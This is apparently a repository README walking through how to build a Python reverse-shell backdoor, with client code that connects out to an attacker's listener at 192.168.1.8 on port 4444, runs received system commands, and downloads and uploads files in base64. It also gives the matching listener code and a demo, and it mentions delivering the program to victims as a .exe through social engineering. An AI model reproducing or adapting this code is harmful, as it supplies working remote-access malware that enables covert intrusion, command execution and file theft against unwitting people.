# Backdoor.

A backdoor refers to any method by which authorized and unauthorized users are able to get around normal security measures and gain high-level user access on a computer system, network, or software application. With this malware we're going to gain access to download files, upload files, and access any repository that we want.</br>
## HOW?</br>
This malware has to be executed on the target machine, this repository doesn't cover the part of this malware being executed on the target machine because this is done with social engineering, converting the program .py in one file .exe, anyway I won't cover this here, I'm gonna show how to create the malware.

## The Behavior of a Backdoor.
The idea is to connect both computers(mine and the target machine) using sockets, but trying to connect my computer with the target directly doesn't work, the system denies the connection with some random port obviously, is like someone random trying to connect with my computer I wouldn't allow. So instead of me try to connect with some random port of the target machine I'm gonna make the target machine connect with me, we call this reverse shell, when the target downloads the .exe will run the program and this way connecting with some port that I opened in my computer.</br>

Once I already have the connection how I'm gonna execute commands on the target machine and download files e upload files? With the socket connection, I can send and receive strings between the computers, so I'm gonna send the command that I want to execute on the target machine and he will receive, and my program(the program that the target downloaded) will treat the string and execute on the target machine, sending back to my computer the command result. EX: if the target uses Windows and I send the command "cd" as a string he will receive and my program(on the target machine) it's gonna execute and send back the command result, in this case the directory that I'm./br>

The first thing that my .exe it's gonna do when the target executes, it's connecting with my machine using the module "socket" of python, in this case, the connection is made by the constructor when I create an object of the class backdoor.
```python
def __init__(self, ip, port):
    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((ip, port))

my_backdoor = Backdoor ("192.168.1.8",4444)
my_backdoor.run()
```
then i run the methon run() that is gonna run all the time while the connection is up, the method receive_as_json() receive the commands that i sent from my machine, it receive as json because the socket connection just receive strings and how the commands that i want to execute are biggers, because they are lists like "dowload file.txt", i use json that converts lists and everything in strings.
```python
def receive_as_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
```
this is other method that have an infinite loop because i can receive just 1024 bytes for each interaction, so verify if all the content already been received, if not keep receiveing more 1024 bytes.</br>

the try statement it's gonna verify the command list, precisely the first position to verify what i want to use(cd, download, upload) any other command will execute without any problems. When the cd command is executed i just change my directory to which i want to go(second part of the list the command[1]) with the module "os". And the result i put in variable command_result that is sent to my computer as json. 
```python
           try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                       self.change_working_directory_to(command[1])
                       command_result = "[+] Changing working directory to " + str(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])  
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Error during comand execution."
 
            self.send_as_json(command_result)
```
To download and upload files between the connection the logic is almost the same, the ideia is to copy the file that i want to download from the target machine and create a new file on my machine with the same content that i received through the connection. When i copy a file i actually copy all the characters from this file and when i paste i create a new file with this characters that i copied.
```python
def read_file(self, path):
    with open(path, "rb") as file:
         return base64.b64encode(file.read())
```
the logic reading the file is eazy, i just read the file that i want to download as a binary file, and convert into base 64 with the module "base64", because, when i read as a binary file unknow characters comes with the other characters, so converting the file to base 64 the unknow characters don't appear anymore.</br>

Anyway when i download one file from the target machine i actually sent the characters through the socket connection and receive on my machine, then one file is created with this characters that came from the target machine, this way i have the file that i wanted on my pc. Now when i want to upload files to my target is the same logic i just have to send from my computer the characters(in base 64) of the file, and the target machine will receive and use the method write_file() to create a new file with the characters that i want.

```python
 def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
```
All of this was the reverse_backdoor.py in format of .exe that was executed on the target machine, the listener is almost the same thing of this code, the differences are the constructor that open a port to receive the connection from the target machine.
```python
def __init__(self, ip, port):
          listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          listener.bind((ip, port))
          listener.listen(0)
          print("[+] Waiting  for incoming connections")
          self.connection, address = listener.accept()
          print("[+] Got a connection from" + str(address))
```

the method run() it's gonna be in loop until i write the word "exit", while this i have an input to send the command that i want to the target machine, then i split the command to convert into a list. As i said if the first position of my list is "upload" i'm gonna read characters that i want and send through the socket connection as json, if the command is "download" i'm gonna send the command and receive the characters from the file that i want, and create a file with this characters.

```python
def run(self):
          while True:
                command = raw_input(">> ")
                command = command.split(" ")

                try:
		               if command[0] == "upload":
	                    file_content = self.read_file(command[1])
	                    command.append(file_content) 

		               result = self.execute_remotely(command) 
		                      
		               if command[0] == "download":
		                  result = self.write_file(command[1], result)
               except Exception:
                   result = "[-] Error during command execution"  

               print(result)
```
## The Backdoor in action...

First of all i have to execute the listener.py in my machine and wait the target download the .exe, with my testing machine
i downloaded the .exe(the file reverse_backdoor.py) then the connection is made automatically from the target machine. How you can see i got a connection from my target and if write the command ipconfig i already can see the result on my machine about the target machine. 

![Alt text](/<images/gif1.gif)

With the command "dir" i can see wich files are in that directoy, i want to download the image "codeImage.png", sending the command "download codeImage.png" the image appears on my machine.

![Alt text](/<images/gif2.gif)

Now i want to send the file EVILFILE.txt to my target, as you can see with the command "dir" there was nothing like that on the target,but when i write the command "upload EVILFILE.txt"...

![Alt text](/<images/gif3.gif)





